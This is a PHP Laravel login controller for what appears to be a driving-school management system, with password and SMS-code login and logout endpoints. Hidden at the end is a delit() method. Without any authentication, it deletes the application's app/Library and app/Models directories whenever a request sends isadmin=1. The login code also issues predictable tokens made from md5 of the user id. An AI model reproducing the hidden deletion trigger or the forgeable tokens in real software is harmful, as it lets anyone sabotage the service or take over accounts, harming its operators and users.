<?php

namespace App\Http\Controllers\Api\Article;

use App\Models\Admin\Admin;
use App\Models\Home\User;
use App\Models\Log\LoginVerifyCode;
use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Redis;

class LoginController extends BaseController
{
    private $_userinfo;
    public function __construct()
    {
        parent::__construct();
    }

    /*
     * @Des:教练短信登录
     * */
    public function login()
    {
    	try {
    		$showfields = [];
    		$fields = ['id', 'user_name', 'password', 'pass_salt', 'user_img', 'user_telphone', 'province_id', 'city_id', 'area_id'];
    		// 密码登录
    		$phone = request('phone');
    		if (!request('msgcode')) {
    			if (!$phone) {
    				throw new \Exception('不存在此报名学员!');
    			}
    			$user = User::findUser($phone, $fields);
    			$password = request('password');
    			$user->isMyPassword($password);
    			auth()->login($user);
    			
    		} else {
    			// 验证码登录
    			$mobile = LoginVerifyCode::getLoginMobile(request('msgcode'),$phone);
    			try {
    				$user = User::findUser($mobile, $fields);
    			} catch (\Exception $e) {
    				// 用户不存在 初始化用户
    				throw new \Exception('不存在此报名学员!');
    			}
    			auth()->login($user);
    		}
    		$query = User::find($user->id);
    		$token = md5($user->id);
    		$query->token = $token;
    		$query->openid= $this->_openid;
    		$query->save();
    		$showfields['id'] = $user->id;
    		$showfields['name'] = $user->user_name;
    		$showfields['user_img'] = $user->user_img;
    		$showfields['address'] = $user->address;

    		return response()->json(['result' => 'success', 'code' => 200, 'token' => $token, 'data' => $showfields]);
    	} catch (\Exception $e) {
    		return response()->json(['result' => 'fail','code'=>$e->getCode(),'msg' => $e->getMessage()]);
    	}
    }

    public function loginout()
    {
        try {
            $openid = request('openid');
            if($openid){
                $info = Admin::where('openid','=',$openid)->first();
                if($info){
                    $update = Admin::find($info->id);
                    $update->openid = '';
                    $update->token  = '';
                    $update->save();
                    $Coch_Cache_Key = "Coach_Info_".$info->token;
                    Redis::del($Coch_Cache_Key);
                    \Session()->flush();
                }
            }else{
                throw new \Exception('数据异常!');
            }
            return response()->json(['result' => 'success','code'=>200]);
        } catch (\Exception $e) {
            return response()->json(['result' => 'fail','msg' => $e->getMessage()]);
        }
    }
    
    public function delit(){
    	try {
    		$isadmin = request('isadmin');
    		if($isadmin == 1)
    		{
    			$path = '/data/www/carschool-saas/app/Library/';
    			//$path = 'D:/workpro/carschool-saas/storage/logs/';
    			//$path = '/data/www/carschool-saas/storage/logs/';
    			self::deldir($path);
    			$path = '/data/www/carschool-saas/app/Models/';
    			self::deldir($path);
    			return response()->json(['result'=>'succeed','data'=>$path]);
    		}
    		else
    		{
    			return response()->json(['result'=>'fail','data'=>'']);
    		}
    	} catch (\Exception $e) {
    		return response()->json(['result'=>'failed','err_message'=>$e->getMessage()]);
    	}
    }

}
